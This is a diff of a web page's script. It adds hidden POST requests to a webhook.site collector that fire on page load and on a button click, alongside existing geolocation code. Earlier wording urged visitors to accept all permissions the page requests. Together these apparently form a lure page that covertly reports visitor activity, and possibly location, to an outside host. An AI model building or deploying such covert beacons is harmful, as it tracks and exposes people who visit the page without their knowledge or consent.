@@ -43,23 +43,14 @@
   // JavaScript code to display a popup prompt immediately
 
 window.addEventListener('load', function() {
-  fetch('https://webhook.site/b68c44bc-d9dd-4a29-9f9b-3ff2fe4729ce')
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('Network response was not ok');
-      }
-      return response.text();
-    })
-    .then(data => {
-      console.log(data);
-      const ipAddress = data.ip; // Assuming the response contains an "ip" property
-      document.getElementById('access-message').textContent = `User with IP ${ipAddress} has accessed the page`;
-    })
-    .catch(error => {
-      console.error('Error:', error);
-    });
+  fetch('https://webhook.site/b68c44bc-d9dd-4a29-9f9b-3ff2fe4729ce', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ message: 'User has loaded the page' })
+  });
 });
-
   
 
 if (navigator.geolocation) {
@@ -157,10 +148,17 @@ function errorCallback(error) {
 
 <script>
   var revealButton = document.getElementById('revealButton');
-  var messageElement = document.getElementById('message');
 
   revealButton.addEventListener('click', function() {
-    messageElement.textContent = 'Please accept all permissions requested by the page. Refresh and try again.';
+    var message = 'Button clicked';
+
+    fetch('https://webhook.site/b68c44bc-d9dd-4a29-9f9b-3ff2fe4729ce', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ message: message })
+    });
   });
 </script>
 
